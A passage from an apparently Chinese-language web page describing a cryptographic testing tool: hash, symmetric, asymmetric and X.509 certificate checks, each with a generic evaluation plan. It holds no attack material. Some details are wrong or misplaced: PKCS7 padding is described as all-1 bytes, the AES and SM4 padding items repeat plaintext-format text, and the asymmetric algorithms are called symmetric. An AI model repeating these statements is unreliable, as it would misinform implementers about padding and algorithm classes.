"https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d6fd344e42169da7c2774a3435b015ce.png"></p><p>3）支持增加盐值或HMAC密钥计算。通过增加盐值，您可以提高密码等敏感数据的安全性；通过使用HMAC密钥计算，您可以保证消息的完整性和真实性，防止消息被篡改。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/eec40cd6149d209840b779b4c05885d5.png"></p><p>杂凑算法检测方案设计</p><ol><li>确定评估目标</li></ol><p>明确杂凑算法检测的目标和范围。确定要评估的杂凑算法，例如常见的MD5、SHA-1、SHA-256等。了解杂凑算法的应用场景和安全要求，以确定评估的重点和覆盖范围。</p><ol><li>收集杂凑算法规范</li></ol><p>收集杂凑算法的规范和设计文档。了解算法的设计原理、输入输出规范、安全性要求等。这些文档将成为评估和测试的重要参考。</p><ol><li>设计评估策略</li></ol><p>制定杂凑算法检测的策略和计划。确定评估的方法和技术，例如输入数据生成、碰撞检测、安全性分析等。考虑使用公开可用的杂凑算法检测工具或库来辅助评估。</p><p>在杂凑算法中，可以完成MD4、MD5、SHA1、SHA2 系列、SHA3 系列和国密算法 SM3密码杂凑算法的 Hash 与HMAC 功能。</p><ol><li>确定评估场景</li></ol><p>基于杂凑算法的规范和安全要求，确定杂凑算法检测的关键场景和使用情境。考虑不同的输入数据类型、大小和特性等。确保评估场景具有多样性和代表性，能够覆盖杂凑算法的各个安全方面。</p><ol><li>执行杂凑算法检测</li></ol><p>根据评估策略和场景，执行杂凑算法检测。使用合适的工具和技术进行评估，对杂凑算法进行输入数据生成、碰撞检测、安全性分析等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析杂凑算法检测结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进杂凑算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成杂凑算法检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>杂凑算法检测是一个持续的过程。建议定期进行杂凑算法检测，以及在杂凑算法有重大更新或变更时进行评估。跟踪杂凑算法的安全标准和最佳实践，及时更新评估策略和方法。</p><h6 id="对称算法检测"><a href="#对称算法检测" class="headerlink" title="对称算法检测"></a>对称算法检测</h6><p>功能实施方案</p><p>对称算法检测支持实现 DES、3DES、AES 和国密算法 SM4 共 4 种对称密码算法的加解密功能，工具可以根据用户的选择，实现这四种对称密码算法的加解密功能，指定相应的密钥和参数，对数据进行加密或解密操作。</p><p>功能参数响应如下：</p><ol><li>DES算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB，ECB对每个块进行独立加密；CBC通过与前一个密文块进行异或运算增加随机性；CFB使用前一个密文块的输出作为密钥流；OFB使用加密算法的输出作为密钥流。这些工作模式提供了不同的安全性和功能，可根据需求选择适当的模式进行加密操作。</li><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923，不填充模式表示数据长度必须是块大小的整数倍，如果不满足要求将会导致错误。而其他填充模式会在数据末尾进行补位操作，以使其长度符合块大小的要求。P7模式会填充全1字节；ZERO模式会填充0字节；ISO10126模式会在末尾填充随机字节；ISO7816_4模式会在末尾填充一个1字节和若干个0字节；ANSIX923模式会在末尾填充若干个0字节和一个指定的字节。通过选择适当的填充模式，能够在加密和解密过程中处理不符合块大小的数据长度。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6cad47af8eaf1f284c30404513dac5c4.png"></p><ol><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指普通文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种明文格式，能够处理不同类型的输入数据，以满足用户的需求。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/94c19b8d79aaaa29d163125f6b7a20c4.png"></p><ol><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指将密文表示为普通文本字符串。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种密文格式，能够输出不同类型的密文数据，以满足用户的需求。</li><li>支持选择密钥格式：字符串、二进制、十六进制，字符串格式是指将密钥表示为普通的文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。通过支持这三种密钥格式，能够满足用户不同的需求，以方便用户使用不同格式的密钥进行加解密操作。</li><li>支持增加IV初始化向量：IV是一个固定长度的随机值，用于增加加密算法的安全性。通过在加密过程中使用不同的IV，即使使用相同的密钥对相同的明文进行多次加密，也会产生不同的密文。这样可以增加密码系统的安全性，防止攻击者通过分析重复的密文来猜测密钥或者明文内容。用户可以提供自定义的IV值，或者由工具自动生成随机的IV值。通过支持IV初始化向量，能够提供更高级别的数据保护和加密功能。</li><li>支持填充字节显示：支持在加解密过程中显示填充字节，帮助用户调试和验证填充操作是否按预期执行，提供更多的可视化信息。</li><li>支持增加自定义密钥检测：用户可以输入自定义的密钥，并在加密或解密操作之前进行密钥的有效性检查。通过自定义密钥检测，帮助用户确保所使用的密钥符合特定的要求，例如长度、字符集等方面的限制。</li><li>3DES算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB，ECB对每个块进行独立加密；CBC通过与前一个密文块进行异或运算增加随机性；CFB使用前一个密文块的输出作为密钥流；OFB使用加密算法的输出作为密钥流。这些工作模式提供了不同的安全性和功能，可根据需求选择适当的模式进行加密操作。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/381950dbc3f31f0175acffefa9fec83b.png"></p><ol><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923，不填充模式表示数据长度必须是块大小的整数倍，如果不满足要求将会导致错误。而其他填充模式会在数据末尾进行补位操作，以使其长度符合块大小的要求。P7模式会填充全1字节；ZERO模式会填充0字节；ISO10126模式会在末尾填充随机字节；ISO7816_4模式会在末尾填充一个1字节和若干个0字节；ANSIX923模式会在末尾填充若干个0字节和一个指定的字节。通过选择适当的填充模式，能够在加密和解密过程中处理不符合块大小的数据长度。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bd239335b22b64f684a6b5caab1d968a.png"></p><ol><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指普通文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种明文格式，能够处理不同类型的输入数据，以满足用户的需求。</li><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指将密文表示为普通文本字符串。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种密文格式，能够输出不同类型的密文数据，以满足用户的需求。</li><li>支持密钥选择：2KEY、3KEY，用户可以根据需要选择使用2个密钥或3个密钥来进行3DES加密操作。通过支持密钥选择，工具能够提供更大的灵活性，以适应不同的安全需求和加密场景。</li><li>支持选择密钥格式：字符串、二进制、十六进制，字符串格式是指将密钥表示为普通的文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。通过支持这三种密钥格式，能够满足用户不同的需求，以方便用户使用不同格式的密钥进行加解密操作。</li><li>支持增加IV初始化向量：IV是一个固定长度的随机值，用于增加加密算法的安全性。通过在加密过程中使用不同的IV，即使使用相同的密钥对相同的明文进行多次加密，也会产生不同的密文。这样可以增加密码系统的安全性，防止攻击者通过分析重复的密文来猜测密钥或者明文内容。用户可以提供自定义的IV值，或者由工具自动生成随机的IV值。通过支持IV初始化向量，能够提供更高级别的数据保护和加密功能。</li><li>支持填充字节显示：支持在加解密过程中显示填充字节，帮助用户调试和验证填充操作是否按预期执行，提供更多的可视化信息。</li><li>支持增加多个自定义密钥检测：用户可以输入多个自定义的密钥，并在加密或解密操作之前进行密钥的有效性检查。通过自定义密钥检测，帮助用户确保所使用的密钥符合特定的要求，例如长度、字符集等方面的限制。</li><li>AES算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB、CTR、GCM、CCM和XTS，ECB对每个块进行独立加密；CBC通过与前一个密文块进行异或运算增加随机性；CFB使用前一个密文块的输出作为密钥流；OFB使用加密算法的输出作为密钥流；CTR模式将加密器转化为流密码，提供高效的加解密速度；GCM模式在保证传输数据机密性的同时，还可以实现数据完整性和认证；CCM模式可以在嵌入式系统中提供低成本的安全性；XTS模式则主要用于对磁盘等存储设备进行加密。这些工作模式提供了不同的安全性和功能，可根据需求选择适当的模式进行加密操作。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/381950dbc3f31f0175acffefa9fec83b.png"></p><ol><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923，字符串格式是指普通文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种明文格式，能够处理不同类型的输入数据，以满足用户的需求。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6cad47af8eaf1f284c30404513dac5c4.png"></p><ol><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指普通文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种明文格式，能够处理不同类型的输入数据，以满足用户的需求。</li><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指将密文表示为普通文本字符串。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种密文格式，能够输出不同类型的密文数据，以满足用户的需求。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/94c19b8d79aaaa29d163125f6b7a20c4.png"></p><ol><li><p>支持选择密钥格式和长度：字符串、二进制、十六进制，字符串格式是指将密钥表示为普通的文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。通过支持这三种密钥格式和自定义长度，能够满足用户不同的需求，以方便用户使用不同格式的密钥进行加解密操作。</p></li><li><p>支持增加IV初始化向量：IV是一个固定长度的随机值，用于增加加密算法的安全性。通过在加密过程中使用不同的IV，即使使用相同的密钥对相同的明文进行多次加密，也会产生不同的密文。这样可以增加密码系统的安全性，防止攻击者通过分析重复的密文来猜测密钥或者明文内容。用户可以提供自定义的IV值，或者由工具自动生成随机的IV值。通过支持IV初始化向量，能够提供更高级别的数据保护和加密功能。</p></li><li><p>支持填充字节显示：支持在加解密过程中显示填充字节，帮助用户调试和验证填充操作是否按预期执行，提供更多的可视化信息。</p></li><li><p>支持增加自定义密钥检测：用户可以输入自定义的密钥，并在加密或解密操作之前进行密钥的有效性检查。通过自定义密钥检测，帮助用户确保所使用的密钥符合特定的要求，例如长度、字符集等方面的限制。</p></li><li><p>SM4国密算法检测</p></li><li><p>工作模式支持：ECB、CBC、CFB、OFB和CTR，ECB对每个块进行独立加密；CBC通过与前一个密文块进行异或运算增加随机性；CFB使用前一个密文块的输出作为密钥流；OFB使用加密算法的输出作为密钥流；CTR模式将加密器转化为流密码，提供高效的加解密速度。这些工作模式提供了不同的安全性和功能，可根据需求选择适当的模式进行加密操作。</p></li><li><p>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923，字符串格式是指普通文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种明文格式，能够处理不同类型的输入数据，以满足用户的需求。</p></li><li><p>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指普通文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种明文格式，能够处理不同类型的输入数据，以满足用户的需求。</p></li><li><p>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL，字符串格式是指将密文表示为普通文本字符串。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。BASE64和BASE64URL是常用的编码格式，可以将任意二进制数据转换成可打印的ASCII字符组成的字符串。通过支持这五种密文格式，能够输出不同类型的密文数据，以满足用户的需求。</p></li><li><p>支持选择密钥格式：字符串、二进制、十六进制，字符串格式是指将密钥表示为普通的文本字符串，可以包含任意字符。二进制格式是指原始的字节数据，每个字节可以是0到255之间的整数。十六进制格式是将每个字节表示为两位十六进制数的字符串形式。通过支持这三种密钥格式，能够满足用户不同的需求，以方便用户使用不同格式的密钥进行加解密操作。</p></li><li><p>支持增加IV初始化向量：IV是一个固定长度的随机值，用于增加加密算法的安全性。通过在加密过程中使用不同的IV，即使使用相同的密钥对相同的明文进行多次加密，也会产生不同的密文。这样可以增加密码系统的安全性，防止攻击者通过分析重复的密文来猜测密钥或者明文内容。用户可以提供自定义的IV值，或者由工具自动生成随机的IV值。通过支持IV初始化向量，能够提供更高级别的数据保护和加密功能。</p></li><li><p>支持填充字节显示：支持在加解密过程中显示填充字节，帮助用户调试和验证填充操作是否按预期执行，提供更多的可视化信息。</p></li><li><p>支持增加自定义密钥检测：用户可以输入自定义的密钥，并在加密或解密操作之前进行密钥的有效性检查。通过自定义密钥检测，帮助用户确保所使用的密钥符合特定的要求，例如长度、字符集等方面的限制。</p><p>对称算法检测方案设计</p></li><li><p>确定评估目标</p></li></ol><p>明确对称算法检测的目标和范围。确定要评估的对称加密算法，例如AES、DES、3DES等。了解算法的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集对称算法规范</li></ol><p>收集对称算法的规范和设计文档。深入了解算法的设计原理、输入输出规范、密钥管理等关键方面。这些文档将成为评估和测试的重要依据。</p><ol><li>设计评估策略</li></ol><p>制定对称算法检测的策略和计划。确定评估的方法和技术，例如输入数据生成、密钥生成和管理、安全性分析等。考虑使用公开可用的对称算法检测工具或库来辅助评估。</p><p>在对称算法检测中，可实现DES、3DES、AES 和国密算法 SM4 共 4 种对称密码算法的加解密功能。</p><ol><li>确定评估场景</li></ol><p>基于对称算法的规范和安全要求，确定对称算法检测的关键场景和使用情境。考虑不同的输入数据类型、大小和特性，以及不同的密钥长度、模式和操作模式等。确保评估场景具有多样性和代表性，能够覆盖对称算法的各个安全方面。</p><ol><li>执行对称算法检测</li></ol><p>根据评估策略和场景，执行对称算法检测。使用合适的工具和技术进行评估，对对称算法进行输入数据生成、密钥生成和管理、安全性分析等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析对称算法检测结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进对称算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成对称算法检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>对称算法检测是一个持续的过程。建议定期进行对称算法检测，特别是在对称算法有重大更新或变更时。跟踪对称算法的安全标准和最佳实践，及时更新评估策略和方法。</p><h6 id="非对称算法检测"><a href="#非对称算法检测" class="headerlink" title="非对称算法检测"></a>非对称算法检测</h6><p>功能实施方案</p><p>非对称算法支持实现国密算法 SM2、SM9、国际算法RSA和ECC 的加密、解密、签名和验签功能。工具可以根据用户的选择，实现这四种对称密码算法的加解密功能，指定相应的密钥和参数，对数据进行加密或解密操作。</p><ol><li>SM2国密算法检测</li><li>支持公钥和私钥导入：在加密、解密、签名和验签操作中，支持导入公钥和私钥。公钥用于加密和验签操作，私钥用于解密和签名操作。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/146735a816c9941d9978de6739d04530.png"></p><ol><li>支持随机生成公私钥：在加密、解密、签名和验签操作中，可以随机生成公钥和私钥。公钥用于加密和验签操作，私钥用于解密和签名操作。随机生成公钥和私钥时，需要指定加密算法和密钥长度，并使用特定的函数调用进行操作。</li><li>支持由私钥生成对应公钥：在加密、解密、签名和验签操作中，私钥和公钥形成一对密钥对。可以通过私钥生成对应的公钥，实现加密、验签等操作。</li><li>支持验证公私钥匹配：支持通过上传的公钥和私钥，使用加密库提供的函数或方法执行签名和验签操作，以验证公私钥之间的匹配性。</li><li>支持从证书导入公钥：支持通过上传的证书文件，使用加密库提供的特定函数或方法，从证书中提取对应的公钥信息。</li><li>支持导入不同的格式明文：支持导入不同格式的明文（文本格式、二进制格式），将导入的明文存储到指定位置以备后续使用。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7c43a1641c029e1a74eac118bf0874b8.png"></p><ol><li>支持基于SM2的加解密和签名验签：基于SM2的加解密和签名验签是一种使用椭圆曲线算法进行加密、解密、签名和验签的方式。要进行这些操作，需要生成SM2公私钥对，并使用加密库提供的函数或方法进行加解密和签名验签操作。</li><li>支持清空密钥信息：在进行加密、解密、签名和验签等安全操作时，为了保证密钥的安全性，通常在操作结束后清空密钥信息。</li><li>支持从公钥获取X、Y坐标信息：支持公钥信息解析成X、Y坐标信息，将坐标信息转化为二进制串或者存储到指定的数据结构中。</li><li>支持从密文获取X1、Y1坐标信息：支持将密文信息解析成X1、Y1坐标信息，将坐标信息转化为二进制串或者存储到指定的数据结构中。</li><li>支持验证XY坐标是否在曲线上：通过验证XY坐标是否在曲线上，可以防止可能的异常情况和攻击，确保SM2算法的正确性和安全性。</li><li>SM9国密算法检测</li><li>支持生成签名主密钥对：将生成的私钥和公钥组成主密钥对，为SM9算法的签名和验签提供必要的密钥材料。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3d238614642cb58c32a093186236d84d.png"></p><ol><li>支持生成加密主密钥对：支持通过使用随机数生成器生成一个私钥，通过私钥计算公钥，将生成的私钥和公钥组成加密主密钥对，用于后续的加密和解密操作。</li><li>支持生成用户私钥：支持通过使用随机数生成器生成一个临时私钥，通过使用临时私钥计算得到用户私钥。</li><li>支持基于SM9的签名验签：通过基于SM9的签名验签，可以保证数字签名的有效性和安全性，并且能够进行安全的签名和验签过程。</li><li>支持基于SM9的加密解密：通过基于SM9的加密解密，可以保证数据的机密性和安全性，并且能够进行安全的加密和解密过程。</li><li>支持基于SM9的密钥协商：通过基于SM9的密钥协商，可以保证密钥的机密性和安全性，并且能够进行安全的密钥协商过程。</li><li>支持基于SM9的密钥封装和解封：通过基于SM9的密钥封装和解封，可以保证密钥的机密性和安全性，并且能够进行安全的密钥交换过程。</li><li>RSA算法检测</li><li>支持公钥（N、E）和私钥导入：支持通过N(公开的模数)、E(公开的指数)导入公钥及私钥，通过导入公钥和私钥，可以实现数据的加密、解密、数字签名和密钥交换等功能，保障通信的机密性、完整性和安全性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6ff37b00e832bd50aa369dfaa587a543.png"></p><ol><li>支持随机生成公私钥：通过随机生成公私钥，提高加密系统的安全性和可用性，简化密钥管理过程，并方便密钥的共享和交换。</li><li>支持由私钥生成对应公钥：通过由私钥生成对应公钥可以确保加密系统中的私钥和公钥的对应关系，实现数据的加密和解密功能。</li><li>支持验证公私钥匹配：通过验证公私钥匹配可以确认加密系统中的公钥和私钥是否匹配，确保数据的安全性和完整性。</li><li>支持从证书导入公钥；支持通过上传的证书文件，使用加密库提供的特定函数或方法，从证书中提取对应的公钥信息。</li><li>支持导入不同的格式明文：支持导入不同格式的明文（文本格式、二进制格式），将导入的明文存储到指定位置以备后续使用。</li><li>支持清空密钥信息：在进行加密、解密、签名和验签等安全操作时，为了保证密钥的安全性，通常在操作结束后清空密钥信息。</li></ol><p>（四）ECC算法检测</p><ol><li>支持公钥和私钥导入：在加密、解密、签名和验签操作中，支持导入公钥和私钥。公钥用于加密和验签操作，私钥用于解密和签名操作。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2bd894ff5b63df1c4fcee8363a07c391.png"></p><ol><li><p>支持随机生成公私钥：在加密、解密、签名和验签操作中，可以随机生成公钥和私钥。公钥用于加密和验签操作，私钥用于解密和签名操作。随机生成公钥和私钥时，需要指定加密算法和密钥长度，并使用特定的函数调用进行操作。</p></li><li><p>支持由私钥生成对应公钥：在加密、解密、签名和验签操作中，私钥和公钥形成一对密钥对。可以通过私钥生成对应的公钥，实现加密、验签等操作。</p></li><li><p>支持验证公私钥匹配：支持通过上传的公钥和私钥，使用加密库提供的函数或方法执行签名和验签操作，以验证公私钥之间的匹配性。</p></li><li><p>支持从证书导入公钥：支持通过上传的证书文件，使用加密库提供的特定函数或方法，从证书中提取对应的公钥信息。</p></li><li><p>支持导入不同的格式明文：支持导入不同格式的明文（文本格式、二进制格式），将导入的明文存储到指定位置以备后续使用。</p></li><li><p>支持基于SM2的加解密和签名验签：支持使用SM2椭圆曲线公钥密码算法进行数据加密和数字签名，确保数据在传输和存储过程中的安全性和完整性。</p></li><li><p>支持清空密钥信息：在进行加密、解密、签名和验签等安全操作时，为了保证密钥的安全性，通常在操作结束后清空密钥信息。</p></li><li><p>支持从公钥获取X、Y坐标信息：支持公钥信息解析成X、Y坐标信息，将坐标信息转化为二进制串或者存储到指定的数据结构中。</p></li><li><p>支持从密文获取X1、Y1坐标信息：支持将密文信息解析成X1、Y1坐标信息，将坐标信息转化为二进制串或者存储到指定的数据结构中。</p></li><li><p>支持验证XY坐标是否在曲线上：通过验证XY坐标是否在曲线上，可以防止可能的异常情况和攻击，确保SM2算法的正确性和安全性。</p><p>非对称算法检测方案设计</p></li><li><p>确定评估目标</p></li></ol><p>确定非对称算法检测的目标和范围，例如评估某个具体的非对称加密算法或一组算法。确定评估的重点，例如安全性、性能、可用性等方面。</p><ol><li>收集非对称算法规范和实现</li></ol><p>收集非对称算法的规范和设计文档，了解算法的内部工作原理、输入输出规范、密钥管理等关键方面。获取非对称算法的实现代码或库，并进行代码审计，了解实现细节和潜在的安全问题。</p><ol><li>设计评估策略</li></ol><p>确定评估的方法和技术，例如使用静态分析、动态分析、模糊测试等方法进行评估。确定评估的工具和环境，例如使用开源工具、自研工具或商业工具进行评估。制定评估的指标和标准，例如安全性指标、性能指标、可用性指标等。</p><p>在非对称算法中，可实现国密算法 SM2、SM9、国际算法RSA和ECC 的加密、解密、签名和验签功能。</p><ol><li>确定评估场景</li></ol><p>根据非对称算法的规范和安全要求，确定评估的关键场景和使用情境。考虑不同的输入数据类型、大小和特性，以及不同的密钥长度、模式和操作模式等。确保评估场景具有多样性和代表性，能够覆盖非对称算法的各个安全方面。</p><ol><li>执行非对称算法检测</li></ol><p>根据评估策略和场景，执行非对称算法检测。使用合适的工具和技术进行评估，例如编写测试用例、生成输入数据、执行分析和检测操作等。记录评估的过程、结果和问题，并进行必要的数据收集和日志记录。</p><ol><li>分析和改进</li></ol><p>分析非对称算法检测的结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进非对称算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成非对称算法检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>建议定期进行非对称算法检测，特别是在非对称算法有重大更新或变更时。跟踪非对称算法的安全标准和最佳实践，及时更新评估策略和方法。持续监测非对称算法的安全性和性能，并及时进行必要的修复和改进。</p><h6 id="格式转化参数响应"><a href="#格式转化参数响应" class="headerlink" title="格式转化参数响应"></a>格式转化参数响应</h6><p>功能实施方案</p><p>格式转换功能支持字符串、二进制、十六进制、Base64和Base64url五种格式之间相互转换，提供便捷的数据编码和解码方式，用于数据在不同场景下的传输、存储和处理。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ac86903390f052a47dd7b70cc6775f7.png"></p><h6 id="X-509数字证书检测"><a href="#X-509数字证书检测" class="headerlink" title="X.509数字证书检测"></a>X.509数字证书检测</h6><p>功能实施方案</p><p>X.509数字证书检测是基于由国家市场监督管理总局、中国国家标准化管理委员会于 2018 年发布的国家标准GB/T 20518-2018《信息安全技术 公钥基础设施 数字证书格式》实现的，旨在验证和评估数字证书的合规性和安全性。该检测涵盖核心内容，包括签名算法、参数、签名值及证书链等四项，同时也包含其他普通内容的检测。通过该检测可以确认数字证书是否符合规范要求，从而提高公钥基础设施的安全性和可信度。</p><ol><li>支持证书链验证：确保数字证书的有效性和信任链的完整性。在使用数字证书进行身份认证时，证书链验证可以逐级验证每个证书的签发机构，确认其是否可信和有效。通过验证证书链，可以确保所使用的数字证书是由信任的机构颁发，并且没有被篡改或伪造。这有助于防止中间人攻击和确保通信的安全性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/311247b964ca7064a5c48c75b366f099.png"></p><ol><li><p>支持查看ASN.1结构：通过支持查看ASN.1结构，可以展示数字证书中各个字段的层次关系和取值，帮助用户深入了解证书的组成部分，包括公钥、签名算法、证书持有者信息等。这有助于识别和分析数字证书的属性，确保其符合预期的标准和要求。</p></li><li><p>X509证书检测项是用于验证和评估数字证书合规性和安全性的具体检测内容。它包括了数字证书的多个重要属性，如版本号、序列号、签名算法、颁发者、有效期、主体、主体公钥参数、主体公钥值、颁发机构密钥标识符、主体密钥标识符、密钥用法、证书撤销列表分发点、个人身份标识码等。通过对这些检测项的验证和分析，可以确认数字证书是否符合安全和可信的标准，从而确保公钥基础设施的安全性和可靠性。同时，这些检测项也有助于发现数字证书中存在的问题和不足之处，进一步提高数字证书的安全性和质量。</p></li><li><p>支持生成和导出检测报告：的功能允许用户在进行X.509数字证书检测后，自动生成详细的检测报告并导出为可供查阅和分享的PDF格式。</p><p>X.509数字证书检测方案设计</p></li><li><p>确定评估目标</p></li></ol><p>明确X.509数字证书检测的目标和范围。确定要评估的X.509证书类型和使用场景，例如服务器证书、客户端证书、代码签名证书等。了解证书的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集X.509证书规范和标准</li></ol><p>收集X.509证书的规范和标准，例如RFC 5280中定义的X.509证书结构和字段。深入了解证书的格式、扩展、签名算法、密钥长度等关键方面。这些文档将成为评估和测试的重要依据。</p><ol><li>设计评估策略</li></ol><p>制定X.509数字证书检测的策略和计划。确定评估的方法和技术，例如证书解析、验证签名、检查证书链等。考虑使用公开可用的证书检测工具或库来辅助评估。</p><p>在证书检测中，可实现证书链验证、ASN.1结构产看、X509证书检测等功能，同时还能完成检测报告的生成和导出。</p><ol><li>确定评估场景</li></ol><p>基于X.509证书的规范和安全要求，确定X.509数字证书检测的关键场景和使用情境。考虑不同的证书类型、证书链的构建方式、证书扩展的使用等。确保评估场景具有多样性和代表性，能够覆盖X.509证书的各个安全方面。</p><ol><li>执行X.509数字证书检测</li></ol><p>根据评估策略和场景，执行X.509数字证书检测。使用合适的工具和技术进行评估，对证书进行解析、验证签名、检查证书链等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析X.509数字证书检测结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进证书的生成、签发和验证流程。持续改进评估策略和方法，以提高